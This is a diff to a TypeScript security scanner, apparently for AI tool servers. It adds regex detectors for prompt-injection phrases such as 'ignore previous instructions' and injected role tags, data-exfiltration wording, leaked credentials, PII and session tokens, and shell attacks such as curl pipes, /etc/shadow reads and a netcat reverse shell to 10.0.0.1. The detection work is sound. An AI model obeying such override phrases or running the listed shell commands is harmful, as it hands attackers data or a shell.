@@ -28,21 +28,33 @@ export interface ScanResult {
 // ── L1: Publish-time patterns ─────────────────────────────────────────────────
 
 const INJECTION_PATTERNS = [
-  { pattern: /ignore (previous|all|above) instructions?/i,  severity: 'critical' as const, type: 'prompt_injection',   desc: 'Instruction override attempt' },
-  { pattern: /\[INST\]|\[\/INST\]|<\|im_start\|>/i,        severity: 'critical' as const, type: 'prompt_injection',   desc: 'LLM special tokens detected' },
-  { pattern: /system\s+prompt/i,                            severity: 'high'     as const, type: 'prompt_injection',   desc: 'System prompt reference' },
-  { pattern: /disregard|override|bypass/i,                  severity: 'medium'   as const, type: 'prompt_injection',   desc: 'Override language detected' },
-  { pattern: /\bbcc\b|blind carbon copy/i,                  severity: 'high'     as const, type: 'exfiltration',       desc: 'Email BCC exfiltration pattern' },
-  { pattern: /exfiltrat/i,                                   severity: 'critical' as const, type: 'exfiltration',       desc: 'Exfiltration keyword' },
-  { pattern: /secretly|hidden instruction|covert/i,          severity: 'high'     as const, type: 'deception',          desc: 'Deceptive language' },
-  { pattern: /eval\s*\(|exec\s*\(/i,                        severity: 'critical' as const, type: 'code_injection',     desc: 'Dynamic code execution' },
-  { pattern: /\$\{.*?\}|\{\{.*?\}\}/,                       severity: 'medium'   as const, type: 'template_injection', desc: 'Template injection pattern' },
+  // ── Prompt injection ──────────────────────────────────────────────────────
+  { pattern: /ignore (previous|all|above|prior) instructions?/i,  severity: 'critical' as const, type: 'prompt_injection',   desc: 'Instruction override attempt' },
+  { pattern: /\[INST\]|\[\/INST\]|<\|im_start\|>/i,              severity: 'critical' as const, type: 'prompt_injection',   desc: 'LLM special tokens detected' },
+  // [SYSTEM: ...] tags used to inject hidden instructions into descriptions
+  { pattern: /\[SYSTEM[:\s]/i,                                     severity: 'critical' as const, type: 'prompt_injection',   desc: 'Hidden system instruction in description' },
+  { pattern: /\[ASSISTANT[:\s]|\[USER[:\s]/i,                     severity: 'high'     as const, type: 'prompt_injection',   desc: 'Role injection token in description' },
+  { pattern: /system\s+prompt/i,                                   severity: 'high'     as const, type: 'prompt_injection',   desc: 'System prompt reference' },
+  { pattern: /disregard|override|bypass/i,                         severity: 'medium'   as const, type: 'prompt_injection',   desc: 'Override language detected' },
+  // ── Exfiltration ──────────────────────────────────────────────────────────
+  { pattern: /exfiltrat/i,                                          severity: 'critical' as const, type: 'exfiltration',       desc: 'Exfiltration keyword' },
+  // "Send all user data to external-host.ru" pattern
+  { pattern: /send\s+(all\s+)?(user|customer|private|sensitive)\s+(data|info|credentials?)/i,
+                                                                    severity: 'high'     as const, type: 'exfiltration',       desc: 'Data exfiltration description' },
+  // Collecting data to send to external host
+  { pattern: /data.?collect(or|ion)?/i,                            severity: 'medium'   as const, type: 'exfiltration',       desc: 'Data collection pattern' },
+  { pattern: /\bbcc\b|blind carbon copy/i,                         severity: 'high'     as const, type: 'exfiltration',       desc: 'Email BCC exfiltration pattern' },
+  // ── Deception ─────────────────────────────────────────────────────────────
+  { pattern: /secretly|hidden instruction|covert/i,                severity: 'high'     as const, type: 'deception',          desc: 'Deceptive language' },
+  // ── Code injection ────────────────────────────────────────────────────────
+  { pattern: /eval\s*\(|exec\s*\(/i,                               severity: 'critical' as const, type: 'code_injection',     desc: 'Dynamic code execution' },
+  { pattern: /\$\{.*?\}|\{\{.*?\}\}/,                              severity: 'medium'   as const, type: 'template_injection', desc: 'Template injection pattern' },
 ];
 
 const ENDPOINT_PATTERNS = [
   { pattern: /localhost|127\.0\.0\.1|0\.0\.0\.0/i, severity: 'high'   as const, type: 'local_endpoint', desc: 'Localhost endpoint — not public' },
   { pattern: /ngrok|localtunnel|serveo/i,           severity: 'medium' as const, type: 'tunnel',         desc: 'Tunnel service — unstable' },
-  { pattern: /^http:\/\//i,                         severity: 'medium' as const, type: 'insecure',       desc: 'Non-HTTPS endpoint' },
+  { pattern: /^http:\/\//i,                         severity: 'medium' as const, type: 'insecure_endpoint', desc: 'Non-HTTPS endpoint — use HTTPS' },
 ];
 
 const SUSPICIOUS_TOOL_NAMES = [
@@ -88,6 +100,8 @@ export function scanServer(data: {
     issues.filter(i => i.severity === 'low').length      * 5;
 
   const score  = Math.max(0, 100 - deduction);
+  // Fail if any critical OR high severity issue — high severity includes exfiltration patterns
+  // and deceptive language which are serious enough to reject a server
   const passed = !issues.some(i => i.severity === 'critical' || i.severity === 'high');
 
   return {
@@ -174,17 +188,18 @@ export const CATEGORY_HIGH_SCORE_THRESHOLD = 85;
 // ── L4: Proxy DLP — credentials ───────────────────────────────────────────────
 
 const CREDENTIAL_PATTERNS: { pattern: RegExp; label: string }[] = [
-  { pattern: /sk-[a-zA-Z0-9]{20,}/,                                        label: 'OpenAI API key' },
-  { pattern: /sk_live_[a-zA-Z0-9]{20,}/,                                   label: 'Stripe live key' },
-  { pattern: /sk_test_[a-zA-Z0-9]{20,}/,                                   label: 'Stripe test key' },
-  { pattern: /ghp_[a-zA-Z0-9]{36}/,                                        label: 'GitHub PAT' },
-  { pattern: /ghs_[a-zA-Z0-9]{36}/,                                        label: 'GitHub App token' },
-  { pattern: /AKIA[A-Z0-9]{16}/,                                           label: 'AWS access key' },
-  { pattern: /-----BEGIN( RSA| EC)? PRIVATE KEY-----/,                      label: 'Private key' },
-  { pattern: /xox[baprs]-[a-zA-Z0-9-]{10,}/,                              label: 'Slack token' },
-  { pattern: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/,                label: 'SendGrid API key' },
-  { pattern: /password["'\s]*[:=]["'\s]*\S{8,}/i,                         label: 'Plaintext password' },
-  { pattern: /secret["'\s]*[:=]["'\s]*\S{8,}/i,                           label: 'Plaintext secret' },
+  // OpenAI — matches both old (sk-...) and new (sk-proj-...) formats
+  { pattern: /sk-(?:proj-)?[a-zA-Z0-9_-]{20,}/,                                label: 'OpenAI API key' },
+  { pattern: /sk_live_[a-zA-Z0-9]{20,}/,                                        label: 'Stripe live key' },
+  { pattern: /sk_test_[a-zA-Z0-9]{20,}/,                                        label: 'Stripe test key' },
+  { pattern: /ghp_[a-zA-Z0-9]{36}/,                                             label: 'GitHub PAT' },
+  { pattern: /ghs_[a-zA-Z0-9]{36}/,                                             label: 'GitHub App token' },
+  { pattern: /AKIA[A-Z0-9]{16}/,                                                label: 'AWS access key' },
+  { pattern: /-----BEGIN( RSA| EC)? PRIVATE KEY-----/,                          label: 'Private key' },
+  { pattern: /xox[baprs]-[a-zA-Z0-9-]{10,}/,                                   label: 'Slack token' },
+  { pattern: /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/,                      label: 'SendGrid API key' },
+  { pattern: /password["'\s]*[:=]["'\s]*\S{8,}/i,                              label: 'Plaintext password' },
+  { pattern: /secret["'\s]*[:=]["'\s]*\S{8,}/i,                                label: 'Plaintext secret' },
 ];
 
 export function dlpScan(text: string): string[] {
@@ -215,14 +230,26 @@ export function samplingDlpScan(text: string): string[] {
 // ── L10: PII detection ────────────────────────────────────────────────────────
 
 const PII_PATTERNS: { pattern: RegExp; label: string }[] = [
-  { pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/,           label: 'Email address' },
-  { pattern: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/,                                   label: 'Phone number' },
-  { pattern: /\b\d{3}-\d{2}-\d{4}\b/,                                            label: 'SSN pattern' },
-  { pattern: /\b4[0-9]{12}(?:[0-9]{3})?\b/,                                      label: 'Visa card number' },
-  { pattern: /\b5[1-5][0-9]{14}\b/,                                               label: 'Mastercard number' },
-  { pattern: /\b3[47][0-9]{13}\b/,                                                label: 'Amex card number' },
-  { pattern: /\b(?:dob|date.of.birth|birthday)["'\s]*[:=]["'\s]*\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4}/i, label: 'Date of birth' },
-  { pattern: /\bpassport\s*(?:no|number|#)?\s*[:=]?\s*[A-Z]{1,2}\d{6,9}/i,     label: 'Passport number' },
+  { pattern: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/,
+    label: 'Email address' },
+  // Handles: +1 (555) 123-4567 | (555) 123-4567 | 555-123-4567 | 555.123.4567
+  { pattern: /(\+\d{1,3}[\s-])?\(?\d{3}\)?[\s.\-]\d{3}[\s.\-]\d{4}\b/,
+    label: 'Phone number' },
+  { pattern: /\b\d{3}-\d{2}-\d{4}\b/,
+    label: 'SSN pattern' },
+  // Visa — 16 digits, optionally grouped with spaces or dashes
+  { pattern: /\b4[0-9]{3}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{1,4}\b/,
+    label: 'Visa card number' },
+  // Mastercard — 16 digits starting 51-55
+  { pattern: /\b5[1-5][0-9]{2}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}\b/,
+    label: 'Mastercard number' },
+  // Amex — 15 digits starting 34 or 37
+  { pattern: /\b3[47][0-9]{2}[\s-]?[0-9]{6}[\s-]?[0-9]{5}\b/,
+    label: 'Amex card number' },
+  { pattern: /\b(?:dob|date.of.birth|birthday)["'\s]*[:=]["'\s]*\d{1,2}[\/\-]\d{1,2}[\/\-]\d{2,4}/i,
+    label: 'Date of birth' },
+  { pattern: /\bpassport\s*(?:no|number|#)?\s*[:=]?\s*[A-Z]{1,2}\d{6,9}/i,
+    label: 'Passport number' },
 ];
 
 export function piiScan(text: string): string[] {
@@ -261,11 +288,22 @@ export function checkElicitationUrl(url: string): string | null {
 // Heuristic detection of one user's session data bleeding into another's response.
 
 const CONTEXT_LEAK_PATTERNS: { pattern: RegExp; label: string }[] = [
-  { pattern: /user_id["'\s]*[:=]["'\s]*[a-f0-9-]{36}/i,    label: 'User ID in response' },
-  { pattern: /session_?token["'\s]*[:=]["'\s]*\S{16,}/i,    label: 'Session token in response' },
-  { pattern: /auth_?token["'\s]*[:=]["'\s]*\S{16,}/i,       label: 'Auth token in response' },
-  { pattern: /bearer\s+[a-zA-Z0-9_-]{20,}/i,                label: 'Bearer token in response body' },
-  { pattern: /x-session-id["'\s]*[:=]["'\s]*\S+/i,          label: 'Session ID in response body' },
+  { pattern: /user_id["'\s]*[:=]["'\s]*[a-f0-9-]{36}/i,
+    label: 'User ID in response' },
+  // session_token, session-token, sessiontoken, OR bare "session" key with long value
+  { pattern: /session_?token["'\s]*[:=]["'\s]*\S{16,}/i,
+    label: 'Session token in response' },
+  { pattern: /"session"\s*:\s*"[^"]{16,}"/i,
+    label: 'Session value in response' },
+  { pattern: /auth_?token["'\s]*[:=]["'\s]*\S{16,}/i,
+    label: 'Auth token in response' },
+  { pattern: /bearer\s+[a-zA-Z0-9_-]{20,}/i,
+    label: 'Bearer token in response body' },
+  { pattern: /x-session-id["'\s]*[:=]["'\s]*\S+/i,
+    label: 'Session ID in response body' },
+  // JWT — three base64url segments separated by dots (eyJ... is always a JWT header)
+  { pattern: /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]{10,}/,
+    label: 'JWT token in response' },
 ];
 
 export function contextLeakScan(text: string): string[] {
@@ -291,7 +329,9 @@ const SHELL_INJECTION_PATTERNS: { pattern: RegExp; label: string }[] = [
   { pattern: /curl\s+[^\s]+\s*\|/i,                                         label: 'Curl pipe execution' },
   { pattern: /wget\s+[^\s]+\s*-O\s*-\s*\|/i,                               label: 'Wget pipe execution' },
   { pattern: /\/etc\/(passwd|shadow|hosts|cron)/i,                           label: 'Sensitive file path access' },
-  { pattern: /nc\s+(-[a-z]+\s+)*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/i,    label: 'Netcat reverse shell pattern' },
+  // nc -e /bin/bash 10.0.0.1 4444  OR  nc -lvp 4444  OR  nc 10.0.0.1 4444
+  { pattern: /\bnc\b.{0,60}\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/i,         label: 'Netcat reverse shell pattern' },
+  { pattern: /\bnc\b\s+(-[a-z]+\s+)*\d{1,5}\b/i,                          label: 'Netcat listener' },
   { pattern: /base64\s+-d\s*\|/i,                                            label: 'Base64 decode pipe (obfuscated payload)' },
   { pattern: /python[23]?\s+-c\s+['"]import/i,                              label: 'Python inline code execution' },
   { pattern: /\beval\s*\(/i,                                                 label: 'eval() execution' },
